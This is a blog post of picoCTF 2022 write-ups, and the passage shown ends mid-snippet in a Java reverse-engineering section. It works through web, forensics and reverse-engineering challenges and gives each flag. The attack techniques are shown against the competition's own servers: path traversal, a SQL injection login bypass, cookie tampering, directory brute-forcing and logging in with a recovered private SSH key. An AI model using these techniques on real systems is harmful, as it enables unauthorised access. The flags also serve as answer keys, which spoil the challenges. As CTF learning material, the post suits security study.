---
layout: post
title: Pico CTF 2022 Writeups 🚩👾👨🏻‍💻
categories:
- CTF
- General-Skills
tags:
- CTF
- Forensics
- Web-exploitation
- Reverse-Engineering
date: 2022-04-01 11:45 +0800
---


## Web exploit

### Local Authority

Can you get the flag?
Go to this website and see what you can discover.

Flag : `picoCTF{j5_15_7r4n5p4r3n7_6309e949}`

First we tried to login using random username and password to get the login failed message. We can check the source of the web page and see that there is a php function that's using password to create a flagfile.

![image1](https://bn1304files.storage.live.com/y4mr1wF0BZ3mPygg7Bh242OTcjsVLVwEDwcCQTb1hIGIYZGGnwqvf_JLB0PrH-Em4fZaY8Le3gKKDa_8lqfK7JN2fEbl_rFrMfErmRTgQmYdklN1k5Xrmzsz1lJNcPgg0Yc5d9vlwlB0gj1dlg-bOuWwIHmD47BRb1I-Fwr7jLWXeUz1EMrwGX_GvRcixuFLKal?width=2868&height=1788&cropmode=none)

From the source, we see another javascirpt file that's checking for username and password.

![image2](https://bn1304files.storage.live.com/y4m2R0MO9Fsj4Jpw60JbNY9ZS2VE4Mj219ywjvjqQ7FoIKfN1_oX6PjtCOUbv3iCeaRZO3CyZRXNtlbwXz2B-eyQa1c4RxOg6csvI3AKPJ6OptbkYeM_kuC_UHPwLjCUVao59Wm63NfjkzqCoLmJt_rT_x0PteBXJslmjroDScmDk4bFBx6tTwTfQQ1x86ys_wp?width=2868&height=1788&cropmode=none)

We can find the flag after successfully logging in.
![image3](https://bn1304files.storage.live.com/y4mbMOfGgYz6moylAsm6f_1dQu_BmjjbZOR9sv4XFZtKs0xJ3EoWaOkZ4dJ1e7kDmenltq2PRhB899YHysvbJ7H9LQA5sOypBD3vkNrgLwT8FUzLTD9p3s4Scp_duENO-ijEDDw-BjPXRx8q9314AgOcdeiKa3Mxr1eNO-vv5itHSh4mmWvSpDaeT2yLKWec7iv?width=2868&height=1788&cropmode=none)

### Includes

Can you get the flag?
Go to this website and see what you can discover.
Flag : `picoCTF{1nclu51v17y_1of2_f7w_2of2_f4593d9d}`

In style.css

`/*picoCTF{1nclu51v17y_1of2_*/`

In script.js

`//  f7w_2of2_f4593d9d}`

### Inspect HTML

Can you get the flag?
Go to this website and see what you can discover.

```<!--picoCTF{1n5p3t0r_0f_h7ml_dd513514}-->```

### Power Cookie

Can you get the flag?
Go to this website and see what you can discover.

Change the cookie value `isAdmin` from `0` to `1` to see the flag.

Flag : `picoCTF{gr4d3_A_c00k13_dcb9f091}`

### Search source

The developer of this website mistakenly left an important artifact in the website source, can you find it?

Mirror the webpage with wget as below and search the flag in custom css file using vscode

```bash
wget -m <http://saturn.picoctf.net:56488/index.html>
```

### Roboto Sans

The flag is somewhere on this web application not necessarily on the website. Find it.
Check this out.

1. Check out robots.txt
2. Decode the base64 strings
3. The path will decode to /js/myfile.txt
4. Navigate to the path and you will see the flag.
Flag : `picoCTF{Who_D03sN7_L1k5_90B0T5_a4f5cc70}`

### Forbidden Paths

Can you get the flag?
Here's the website.
We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?

Craft the below LFI exploit to read the contents of flag.txt file using relative path.
`../../../../flag.txt`

Flag : `picoCTF{7h3_p47h_70_5ucc355_26b22ab3}`

### Secrets

We have several pages hidden. Can you find the one with the flag?
The website is running here.

```bash
gobuster -u http://saturn.picoctf.net:54925/ -w /opt/seclists/Discovery/Web-Content/common.txt -t 20

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://saturn.picoctf.net:54925/
[+] Threads      : 20
[+] Wordlist     : /opt/seclists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/03/16 13:07:44 Starting gobuster
=====================================================
/index.html (Status: 200)
/secret (Status: 301)
=====================================================
2022/03/16 13:08:43 Finished
=====================================================
```

By visiting the the `/secret` you will get redirected. Just need to put in the port number again to reach the page as shown in the screenshot below. However, there are no flags here. But as we look into the sources via developer console we can see that there is another hidden directory in secret.

![almost](https://bn1304files.storage.live.com/y4mip1DR3vLtRPSlDVDCvz9u5Vs5Mu9_ATaCmH5OCTGspF1ic7TvzIKpphfAjdGJM3W5x1J-hIGudVzr9zIFVbC2FvVXg2MmuVw387Z4q8wSYeO6E767ZnzkGteu6GhUR6fI6tLVKKrvVlflad0gApLA4Jk5sbB-ZD57kET7cK1wc3XIeqMMjKIopPMzyXJxK3u?width=2860&height=1658&cropmode=none)

By diving deeper into the hidden folder and finally we are able to see the `secret/hidden/superhidden/` directory as below with the flag in html.

![found](https://bn1304files.storage.live.com/y4mDF3Ud4FIK71TAbICUfUskJktZc0q8VIwZnUw3D9yk77S7jRv025RGSDUa9x6Y3xCT_NDrPDY-wN06TL5RLVUHeqzxkjMKrBC-9wP8IfUMOvlOMSOd9AofhPu5PJAZgRxm7r-7F7Tc_vpSgjCtvMmtq7DisJee7q7v_q6RU2zDfcTGYOj9bKFXxZbRKGxMQxL?width=2860&height=1658&cropmode=none)

Flag : `picoCTF{succ3ss_@h3n1c@10n_34327aaf}`

### SQL Direct

Connect to this PostgreSQL server and find the flag!

```bash
psql -h saturn.picoctf.net -p 57594 -U postgres pico
```

```SQL
pico=# help;
You are using psql, the command-line interface to PostgreSQL.
Type:  \copyright for distribution terms
       \h for help with SQL commands
       \? for help with psql commands
       \g or terminate with semicolon to execute query
       \q to quit

pico=# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)

pico=# SELECT * FROM flags;
 id | firstname | lastname  |                address                 
----+-----------+-----------+----------------------------------------
  1 | Luke      | Skywalker | picoCTF{L3arN_S0m3_5qL_t0d4Y_0414477f}
  2 | Leia      | Organa    | Alderaan
  3 | Han       | Solo      | Corellia
(3 rows)
```

Flag : `picoctf{L3arN_S0m3_5qL_t0d4Y_0414477f}`

### SQLiLite

Can you login to this website?

```txt
username:admin'--
password:admin'--
```

![flag](https://bn1304files.storage.live.com/y4mFPqWhF-8azrwfd5EeDRY5z_n35EMCrAVdgqc0MKXI7VzpYb26iFk99pFhW3epEqULswunY7GZQCVkydiBtFmLJSwOwmUfsveKNla2eXT-urQSSZcIu1osgUMSAY8u5_6d7cB7UhOvCBz6bi0qQ51tASoQcuQAlmSaq4G9QfMLzLHHUSwsW48V8Aji3-IOj7b?width=2872&height=1656&cropmode=none)

Your flag is: `picoCTF{L00k5_l1k3_y0u_solv3d_it_33d32a56}`

## Forensics

### Enhance

Download this image file and find the flag.

```bash
strings drawing.flag.svg
picoCTF{3nh4nc3d_58bd3420}
```

Flag : `picoCTF{3nh4nc3d_58bd3420}`

### Lookey here

Attackers have hidden information in a very large mass of data in the past, maybe they are still doing it.

```bash
grep 'pico' anthem.flag.txt 
      we think that the men of picoCTF{gr3p_15_@w3s0m3_429334b2}
```

Flag : `picoCTF{gr3p_15_@w3s0m3_429334b2}`

### File types

This file was found among some files marked confidential but my pdf reader cannot read it, maybe yours can.

```bash
file Flag.pdf 
Flag.pdf: shell archive text

mv Flag.pdf Flag.sh
chmod +x Flag.sh
/Flag.sh
x - created lock directory _sh00047.
x - extracting flag (text)
x - removed lock directory _sh00047.
ll
-rw-r--r-- 1 sansforensics sansforensics 1.1K Mar 15 06:50 flag
-rwxrwxr-x 1 sansforensics sansforensics 5.1K Mar 15 06:50 Flag.sh
file flag
flag: current ar archive
binwalk flag

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
100           0x64            bzip2 compressed data, block size = 900k

binwalk --dd='.*' flag
➜  forensics ls
anthem.flag.txt  drawing.svg  flag  _flag.extracted  Flag.sh
➜  forensics cd _flag.extracted 
➜  _flag.extracted ls
64
➜  _flag.extracted file 64 
64: bzip2 compressed data, block size = 900k
➜  _flag.extracted mv 64 file.bzip2
➜  _flag.extracted bzip2 -d file.bzip2
bzip2: Can't guess original name for file.bzip2 -- using file.bzip2.out

bzip2: file.bzip2: trailing garbage after EOF ignored
➜  _flag.extracted ls
file.bzip2.out
➜  _flag.extracted file file.bzip2.out 
file.bzip2.out: gzip compressed data, was "flag", last modified: Tue Mar 15 06:50:46 2022, from Unix, original size modulo 2^32 330
➜  _flag.extracted mv file.bzip2.out file.gz
➜  _flag.extracted gzip -d file.gz 
➜  _flag.extracted ls
file
➜  _flag.extracted file file
file: lzip compressed data, version: 1
➜  _flag.extracted mv file file.lz
➜  _flag.extracted lzip -d file.lz 
zsh: command not found: lzip
➜  _flag.extracted lzip -d file.lz
➜  _flag.extracted ls
file
➜  _flag.extracted file file
file: LZ4 compressed data (v1.4+)
➜  _flag.extracted mv file file.lz4
➜  _flag.extracted lz4 -d file.lz4 
Decoding file file 
                                                                          file.lz4             : decoded 266 bytes 
➜  _flag.extracted ls
file  file.lz4
➜  _flag.extracted file file
file: LZMA compressed data, non-streamed, size 255
➜  _flag.extracted mv file file.lzma
➜  _flag.extracted lzma -d file.lzma 
➜  _flag.extracted ls
file  file.lz4
➜  _flag.extracted file file
file: lzop compressed data - version 1.040, LZO1X-1, os: Unix
➜  _flag.extracted mv file file.lzop
➜  _flag.extracted lzop -d file.lz
lzop: file.lz: can't open input file: No such file or directory
➜  _flag.extracted lzop -d file.lzop 
➜  _flag.extracted ls
file  file.lz4  file.lzop
➜  _flag.extracted file file
file: lzip compressed data, version: 1
➜  _flag.extracted mv file file.lzip
➜  _flag.extracted lzip -d file.lzip
➜  _flag.extracted ls
file.lz4  file.lzip.out  file.lzop
➜  _flag.extracted file file.lzip.out 
file.lzip.out: XZ compressed data
➜  _flag.extracted rm file.lz4
➜  _flag.extracted rm file.lzop
➜  _flag.extracted ls
file.lzip.out
➜  _flag.extracted file file.lzip.out 
file.lzip.out: XZ compressed data
➜  _flag.extracted mv file.lzip.out file.xz
➜  _flag.extracted xz -d file.xz 
➜  _flag.extracted ls
file
➜  _flag.extracted file file
file: ASCII text
➜  _flag.extracted cat file 
7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f
6630725f3062326375723137795f35613833373565307d0a
➜  _flag.extracted echo '7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f
6630725f3062326375723137795f35613833373565307d0a' | xxd -r -p
picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_5a8375e0}
```

Flag: `picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_5a8375e0}`

### Packets Primer

Download the packet capture file and use packet analysis software to find the flag.

```bash
strings network-dump.flag.pcap
k&Nar
n#('
k&Na
k&Na`
n#('
k&Na;
n#('
p i c o C T F { p 4 c k 3 7 _5 h 4 r k_ 7 d 3 2 b 1 d e }
k&Naa
ep&Na(
p&NaX
p&Na28
p&Na
```

Flag : `picoCTF{p4ck37_5h4rk_7d32b1de}`

### Redaction gone wrong

Now you DON’T see me.
This report has some critical data in it, some of which have been redacted correctly, while some were not. Can you find an important key that was not redacted properly?

Use wondershare pdf to move the redacted portions as per screenshot below.

![image](https://bn1304files.storage.live.com/y4m4t6cEqcHGy2WTGrLAU8mK0nELR3ymhEt7hNixDuJzyuvBlzcAG2T_ygUPB9Nj5rhw1g76QQXcPkTMaK8t9FaYtQT2RCI8P07fzu2UQKXiUm54n53n9epf__DSj3tAwP4_r-2-xM6oUVrLaMB0pQM_Id5ndNRgp8VyU-pgwEQysP3PwER2PwEs1W9mo5R49av?width=2876&height=1334&cropmode=none)

Flag : `picoCTF{C4n_Y0u_S33_m3_fully}`

### sleuthkit intro

Download the disk image and use mmls on it to find the size of the Linux partition. Connect to the remote checker service to check your answer and get the flag.
Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.

```bash
gzip -d disk.img.gz
mmls disk.img 

DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000204799   0000202752   Linux (0x83)

nc saturn.picoctf.net 52279

What is the size of the Linux partition in the given disk image?
Length in sectors: 0000202752
0000202752
Great work!
picoCTF{mm15_f7w!}
```

Flag : `picoCTF{mm15_f7w!}`

### sleuthkit apprentice

Download this disk image and find the flag.
Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.

Open the disk image in autopsy. Navigate to partition 3 path as below.

Contents Of File: /3/root/.ash_history

```bash
apk add nano
mkdir my_folder
cd my_folder/
nano flag.txt
ls -al
iconv -f ascii -t utf16 > flag.uni.txt
l
ls -al
iconv -f ascii -t utf16 flag.txt > flag.uni.txt
ls -al
shred
shred -zu flag.txt 
ls -al
halt
```

From the bash history, we can see that the flag is obfuscated in `my_folder/` directory. You can use a text editor to replace the `�` characters.
Contents Of File: /3/root/my_folder/flag.uni.txt

```txt
�p�i�c�o�C�T�F�{�b�y�7�3�_�5�u�r�f�3�r�_�4�2�0�2�8�1�2�0�}�
picoCTF{by73_5urf3r_42028120}
```

Flag : `picoCTF{by73_5urf3r_42028120}`

### Eavesdrop

Download this packet capture and find the flag.

Using wireshark, you can read the insecure conversation as below.

```txt
Hey, how do you decrypt this file again?
You're serious?
Yeah, I'm serious
*sigh* openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123
Ok, great, thanks.
Let's use Discord next time, it's more secure.
C'mon, no one knows we use this program like this!
Whatever.
Hey.
Yeah?
Could you transfer the file to me again?
Oh great. Ok, over 9002?
Yeah, listening.
Sent it
Got it.
You're unbelievable
```

You can filter the wireshark results to port 9002 to find the tcp payload in hex as per screenshot.

![wireshark](https://bn1304files.storage.live.com/y4mgcTZrEC1ea0QZs9JqWqG255WrvWnUUeeDECk_7z_F_0US4OHLQpiytyXA4VWSI92yAzQmGg2mPIvcMt_oyb2nxCd3c0fNz6N1LzP2uugw6VZSqZRUJzX2XKJZE_hdpM_77Jt4NoghnGMruBnf_uPQK9D1Q0X-MwoDr1ZRBab2DUQUhHXMFz279HSktnkCHWr?width=2744&height=1678&cropmode=none)

once you get the hex, you can dump the file as below and decrypt the file to get the flag.

```bash
➜  salt echo '53616c7465645f5f03a915e72c0fb75f352ada1e0731570d636caf9b67ac264802625a9448b654d1ce8afba4dcae8707' | xxd -r -p > data
➜  salt ls
data
➜  salt file data
data: openssl enc'd data with salted password
➜  salt openssl des3 -d -salt -in data -out file.txt -k supersecretpassword123
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
➜  salt ls
data  file.txt  salted  salt.pcap
➜  salt cat file.txt
picoCTF{nc_73115_411_77b05957}
```

Flag : `picoCTF{nc_73115_411_77b05957}`

### Operation-Oni

Download this disk image, find the key and log into the remote machine.
Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.

Open the disk using autopsy. Find the ssh file from the disk and connect.

Contents Of File: /2/root/.ssh/id_ed25519

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBgrXe4bKNhOzkCLWOmk4zDMimW9RVZngX51Y8h3BmKLAAAAJgxpYKDMaWC
gwAAAAtzc2gtZWQyNTUxOQAAACBgrXe4bKNhOzkCLWOmk4zDMimW9RVZngX51Y8h3BmKLA
AAAECItu0F8DIjWxTp+KeMDvX1lQwYtUvP2SfSVOfMOChxYGCtd7hso2E7OQItY6aTjMMy
KZb1FVmeBfnVjyHcGYosAAAADnJvb3RAbG9jYWxob3N0AQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

Contents Of File: /2/root/.ssh/id_ed25519.pub

```bash
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGCtd7hso2E7OQItY6aTjMMyKZb1FVmeBfnVjyHcGYos root@localhost
```

```bash
➜  operationoni vi id_ed25519
➜  operationoni chmod 400 id_ed25519 
➜  operationoni ssh -i id_ed25519 -p 57976 ctf-player@saturn.picoctf.net 
The authenticity of host '[saturn.picoctf.net]:57976 ([18.217.86.78]:57976)' can't be established.
ECDSA key fingerprint is SHA256:0L/+wJ14/Sk4s6Ue+TxXnAW7qNBuaMeIxA9dXp2zzaU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:57976,[18.217.86.78]:57976' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf-player@challenge:~$ ls
flag.txt
ctf-player@challenge:~$ cat flag.txt
picoCTF{k3y_5l3u7h_af277f77}
ctf-player@challenge:~$
```

Flag : `picoCTF{k3y_5l3u7h_af277f77}`

### Operation Orchid

Download this disk image and find the flag.
Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.

Open the disk file in autopsy.

Contents Of File: /3/root/.ash_history

```bash
touch flag.txt
nano flag.txt 
apk get nano
apk --help
apk add nano
nano flag.txt 
openssl
openssl aes256 -salt -in flag.txt -out flag.txt.enc -k unbreakablepassword1234567
shred -u flag.txt
ls -al
halt
```

Contents Of File: /3/root/flag.txt

```txt
           -0.881573            34.311733
```

Contents Of File: /3/root/flag.txt.enc

```txt
Salted__k0]�=�fz
VF8��i�ns�|,��W
����܁��s�Ȥ7� ���؎$�'%
```

Export the flag.txt.enc from autopsy and decrypt the file as below.

```bash
➜  operationorchid ls
disk.flag.img  flag.txt.enc
➜  operationorchid openssl aes256 -d -salt -in flag.txt.enc -out flag.txt -k unbreakablepassword1234567
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
bad decrypt
140318892737856:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:../crypto/evp/evp_enc.c:610:
➜  operationorchid ls
disk.flag.img  flag.txt  flag.txt.enc
➜  operationorchid cat flag.txt
picoCTF{h4un71ng_p457_17237fce}
```

## Reverse Engineering

### file-run1

A program has been provided to you, what happens if you try to run it on the command line?
Download the program here.

```bash
➜  revEngineer ls
run
➜  revEngineer file run 
run: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f9df27b4be0359f544470c9df7db39f209366c6c, for GNU/Linux 3.2.0, not stripped
➜  revEngineer chmod +x run 
➜  revEngineer ./run 
The flag is: picoCTF{U51N6_Y0Ur_F1r57_F113_5578e314}
```

Flag : `picoCTF{U51N6_Y0Ur_F1r57_F113_5578e314}`

### file-run2

Another program, but this time, it seems to want some input. What happens if you try to run it on the command line with input "Hello!"?
Download the program here.

```bash
➜  file-run2 chmod +x run 
➜  file-run2 ./run Hello!
The flag is: picoCTF{F1r57_4rgum3n7_981abfb5}
```

Flag : `picoCTF{F1r57_4rgum3n7_981abfb5}`

### GDB Test Drive

Can you get the flag?
Download this binary.
Here's the test drive instructions:

```bash
$ chmod +x gdbme
$ gdb gdbme
(gdb) layout asm
(gdb) break *(main+99)
(gdb) run
(gdb) jump *(main+104)
```

![image](https://bn1304files.storage.live.com/y4mOnMFNBYYvHqB8_ZnB0U-CeIMG70PQecKXO5ufMCV4vJcyyKBiLmxKWPWVN3lkmsJuV-Ypp7X80i6nHCjNkeWPNihCWOWF-8sWa0ZAiS6JGTr7H6kjQex3hmBXbhSqbtniMHZFAuh8M9d19xdTZaAq35Qc8oXvOFax7dZVH1MynwMbV2dD8rigPUSHW5wS4Wz?width=2750&height=1658&cropmode=none)

```bash
(gdb) break *(main+99)
Breakpoint 1 at 0x132a
(gdb) run
Starting program: /cases/pico2022/revEngineer/gbdtestdrive/gdbme

Breakpoint 1, 0x000055555555532a in main ()
(gdb) jump *(main+104)
Continuing at 0x55555555532f.
picoCTF{d3bugg3r_dr1v3_93b87433}
(gdb) ior 1 (process 23118) exited normally]
```

Flag : `picoCTF{d3bugg3r_dr1v3_93b87433}`

### patchme.py

Can you get the flag?
Run this Python program in the same directory as this encrypted flag.

patchme.flag.py

```python
### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)        
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################


flag_enc = open('flag.txt.enc', 'rb').read()



def level_1_pw_check():
    user_pw = input("Please enter correct password for flag: ")
    if( user_pw == "ak98" + \
                   "-=90" + \
                   "adfjhgj321" + \
                   "sleuth9000"):
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), "utilitarian")
        print(decryption)
        return
    print("That password is incorrect")



level_1_pw_check()
```

We simply need to change the if condition as below to decrypt the flag regardless of incorrect password.

```python
def level_1_pw_check():
    user_pw = input("Please enter correct password for flag: ")
    if( user_pw != "ak98" + \
                   "-=90" + \
                   "adfjhgj321" + \
                   "sleuth9000"):
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), "utilitarian")
        print(decryption)
        return
    print("That password is incorrect")
```

```bash
python patchme.flag.py 
Please enter correct password for flag: haha
Welcome back... your flag, user:
picoCTF{p47ch1ng_l1f3_h4ck_4d5af99c}
```

Flag : `picoCTF{p47ch1ng_l1f3_h4ck_4d5af99c}`

### Safe Opener

Can you open this safe?
I forgot the key to my safe but this program is supposed to help me with retrieving the lost key. Can you help me unlock my safe?
Put the password you recover into the picoCTF flag format like:
picoCTF{password}

```java
import java.io.*;
import java.util.*;  
public class SafeOpener {
    public static void main(String args[]) throws IOException {
        BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in));
        Base64.Encoder encoder = Base64.getEncoder();
        String encodedkey = "";
        String key = "";
        int i = 0;
        boolean isOpen;
        

        while (i < 3) {
            System.out.print("Enter password for the safe: ");
            key = keyboard.readLine();

            encodedkey = encoder.encodeToString(key.getBytes());
            System.out.println(encodedkey);
              
            isOpen = openSafe(encodedkey);
            if (!isOpen) {
                System.out.println("You have  " + (2 - i) + " attempt(s) left");
                i++;
                continue;
            }
            break;
        }
    }
    
    public static boolean openSafe(String password) {
        String encodedkey = "cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz";
        
        if (password.equals(encodedkey)) {
            System.out.println("Sesame open");
            return true;
        }
        else {
            System.out.println("Password is incorrect\n");
            return false;
        }
    }
}
```

You're given a java program to reverse engineer the password from. From the program we can see that the password string is encoded in base64. We can simply do as below.

```bash
➜  safeopener echo 'cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz' | base64 -d
pl3as3_l3t_m3_1nt0_th3_saf3
```

```bash
➜  safeopener java SafeOpener
Enter password for the safe: pl3as3_l3t_m3_1nt0_th3_saf3
cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz
Sesame open
```

Flag : `picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}`

### unpackme.py

Can you get the flag?
Reverse engineer this Python program.

```python
import base64
from cryptography.fernet import Fernet

payload = b'gAAAAABiMD1Dt87s50caSunQlHoZqPOwtGNaQXexN-gjKwZeuLEN_-v6UcFJHVXOT4B6DcD1SB7cnd6yTcHg9e9LZCAeJY2cJ0r0sfyGPRiH60F-WbkyUjlAdDywI8RPdTpDYLuBmpZ_Kun-kHyTzMjeKR6R26Z4JITUS8n7Dj9X--9eNLajH6UuYD4GkjRACpsidl_8z33DlB86u_xDCMMm7HFK2oJTs8HG1fBex6enQsu0frUAJbx56DxhRvWawAysDMtLE50vaohrzkVV7Yaz4ClilwgfjQ=='

key_str = 'correctstaplecorrectstaplecorrec'
key_base64 = base64.b64encode(key_str.encode())
f = Fernet(key_base64)
plain = f.decrypt(payload)
exec(plain.decode())
```

We can simply run the program line by line via python interpreter to reverse engineer the code.

```python
>>> payload = b'gAAAAABiMD1Dt87s50caSunQlHoZqPOwtGNaQXexN-gjKwZeuLEN_-v6UcFJHVXOT4B6DcD1SB7cnd6yTcHg9e9LZCAeJY2cJ0r0sfyGPRiH60F-WbkyUjlAdDywI8RPdTpDYLuBmpZ_Kun-kHyTzMjeKR6R26Z4JITUS8n7Dj9X--9eNLajH6UuYD4GkjRACpsidl_8z33DlB86u_xDCMMm7HFK2oJTs8HG1fBex6enQsu0frUAJbx56DxhRvWawAysDMtLE50vaohrzkVV7Yaz4ClilwgfjQ=='
>>> key_str = 'correctstaplecorrectstaplecorrec'
>>> key_base64 = base64.b64encode(key_str.encode())
>>> key_base64
b'Y29ycmVjdHN0YXBsZWNvcnJlY3RzdGFwbGVjb3JyZWM='
>>> f = Fernet(key_base64)
>>> f
<cryptography.fernet.Fernet object at 0x7fc9bb354dc0>
>>> plain = f.decrypt(payload)
>>> plain
b"\npw = input('What\\'s the password? ')\n\nif pw == 'batteryhorse':\n  print('picoCTF{175_chr157m45_8aef58d2}')\nelse:\n  print('That password is incorrect.')\n\n"
```

```bash
➜  unpackmepy python unpackme.flag.py 
What's the password? batteryhorse
picoCTF{175_chr157m45_8aef58d2}
```

Flag : `picoCTF{175_chr157m45_8aef58d2}`

### bloat.py

Can you get the flag?
Run this Python program in the same directory as this encrypted flag.

```bash
➜  bloatpy python bloat.flag.py 
Please enter correct password for flag: dunno
That password is incorrect
```

Reviewing the python program, the function `arg133()` seems to be the place where the program is checking for user input for correct password.

```python
if arg432 == a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]
```

```python
import sys
a = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ"+ \
            "[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ "

def arg133(arg432):
  if arg432 == a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]:
    return True
  else:
    print(a[51]+a[71]+a[64]+a[83]+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+\
a[81]+a[67]+a[94]+a[72]+a[82]+a[94]+a[72]+a[77]+a[66]+a[78]+a[81]+\
a[81]+a[68]+a[66]+a[83])
    sys.exit(0)
    return False

def arg111(arg444):
  return arg122(arg444.decode(), a[81]+a[64]+a[79]+a[82]+a[66]+a[64]+a[75]+\
a[75]+a[72]+a[78]+a[77])

def arg232():
  return input(a[47]+a[75]+a[68]+a[64]+a[82]+a[68]+a[94]+a[68]+a[77]+a[83]+\
a[68]+a[81]+a[94]+a[66]+a[78]+a[81]+a[81]+a[68]+a[66]+a[83]+\
a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+a[81]+a[67]+a[94]+\
a[69]+a[78]+a[81]+a[94]+a[69]+a[75]+a[64]+a[70]+a[25]+a[94])

def arg132():
  return open('flag.txt.enc', 'rb').read()

def arg112():
  print(a[54]+a[68]+a[75]+a[66]+a[78]+a[76]+a[68]+a[94]+a[65]+a[64]+a[66]+\
a[74]+a[13]+a[13]+a[13]+a[94]+a[88]+a[78]+a[84]+a[81]+a[94]+a[69]+\
a[75]+a[64]+a[70]+a[11]+a[94]+a[84]+a[82]+a[68]+a[81]+a[25])

def arg122(arg432, arg423):
    arg433 = arg423
    i = 0
    while len(arg433) < len(arg432):
        arg433 = arg433 + arg423[i]
        i = (i + 1) % len(arg423)        
    return "".join([chr(ord(arg422) ^ ord(arg442)) for (arg422,arg442) in zip(arg432,arg433)])
    
arg444 = arg132()
arg432 = arg232()
arg133(arg432)
arg112()
arg423 = arg111(arg444)
print(arg423)
sys.exit(0)
```

So we can simply reverse engineer the password from the python interpreter as below.

```python
>>> a = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ"+ \
            "[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ "
>>> a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]
'happychance'
```

```bash
➜  bloatpy python bloat.flag.py 
Please enter correct password for flag: happychance
Welcome back... your flag, user:
picoCTF{d30bfu5c4710n_f7w_c47f9e9c}
```

Flag : `picoCTF{d30bfu5c4710n_f7w_c47f9e9c}`

### Fresh java

Can you get the flag?
Reverse engineer this Java program.

The java program is loaded into ghidra.

![ghidra](https://bn1304files.storage.live.com/y4mTarSwIjZaWdy2yGbyHnir3TbP0GL0fPaHD1enBKLCIGTLpvaDCzH3WZQPE6wZeqYUK23825rsncI8lugUbvZ7FM7FhjGIUXmMy0HW5MxLPrIAHLR89q6FUJkodF0V6tvQZbwTV7Hw1TnBL5gDDwPG1XBu6KPzsSiWtMR-DMAnI9kcxHte0DvFOmehX-LX3I7?width=2860&height=1724&cropmode=none)

From the program's logic, we can see that it is checking each character for correct password. From here we can manually reverse engineer the password.

![repasswd](https://bn1304files.storage.live.com/y4m6kgyqvVVFRCCCj7hSSKhvoqlujSzdCac6asg7C8Tb_cSlJ3sGy9sBQc-GNzB0SV55kqjNOPzRGrvi2I1xSURcFOJ2sZlE5bIb3xyKhO9AuE6HIzwFDh0F7xoeXXxV8n206Dj4d2S_i_8mBfg-4esLCTMDgYsu6GId-EySQtIqzAlXm2bALTQPQAQzniJ9uBw?width=2860&height=1732&cropmode=none)

```java
  cVar3 = objectRef.charAt(0x21);
  if (cVar3 != '}') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x20);
  if (cVar3 != '0') {
    pPVar1 = System.out;
